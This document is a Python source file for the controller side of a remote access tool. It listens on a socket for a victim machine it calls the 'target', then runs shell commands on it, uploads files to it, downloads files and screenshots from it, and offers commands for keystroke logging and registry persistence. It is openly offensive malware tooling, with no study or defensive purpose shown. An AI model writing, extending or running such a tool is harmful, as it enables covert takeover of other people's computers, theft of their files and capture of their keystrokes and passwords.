import socket
import json
import os


def send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def recieve():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def communicator():
    count=0
    while True:
        command = input(' * Shell~%s : '% str(ip))
        send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' %(count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1

        elif command == 'help':
            print('''\n
            quit                            ->> quits the session with the target
            clear                           ->> clears the screen
            cd *directory name*             ->> changes directory on the target system
            upload*file*                    ->> uploads file to the target system
            download*file*                  ->> downloads a file from target system
            keylog_start                    ->> will initiate the keylogger on the target system
            keylog_dump                     ->> displays the keystrokes the target inputted
            keylog_stop                     ->> stops and self destructs the keylogger file
            persistence *Regname* *file*    ->> creates persistence in registry''')
        else:
            res = recieve()
            print(res)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1',3000))
print('listening on port 3000')
sock.listen(5)
target, ip = sock.accept()
print('target of ipadress '+ str(ip) + 'connected')
communicator()